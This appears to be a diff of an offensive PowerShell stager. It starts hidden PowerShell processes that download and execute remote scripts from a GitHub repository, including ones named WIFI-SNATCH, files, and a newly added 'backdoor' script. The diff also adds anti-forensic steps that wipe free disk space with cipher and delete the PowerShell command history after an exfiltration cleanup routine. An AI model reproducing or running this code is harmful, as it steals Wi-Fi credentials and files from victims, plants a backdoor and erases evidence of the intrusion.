@@ -10,6 +10,7 @@ start powershell -argumentlist '-windowstyle hidden $px = iwr https://github.com
 start powershell -argumentlist '-windowstyle hidden $pg = iwr https://github.com/skekic16/lol/raw/main/WIFI-SNATCH.ps1?dl=1; invoke-expression $pg'
 start powershell -argumentlist '-windowstyle hidden $pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expression $pw'
 
+start powershell -argumentlist '-windowstyle hidden $backdoor = iwr https://github.com/skekic16/lol/raw/main/BPC.ps1?dl=1; invoke-expression $backdoor'
 
 
 
@@ -27,5 +28,7 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 }
 Clean-Exfil
+start powershell -argumentlist '-windowstyle hidden cipher /w:c'
+Remove-Item (Get-PSreadlineOption).HistorySavePath
 cls
 exit
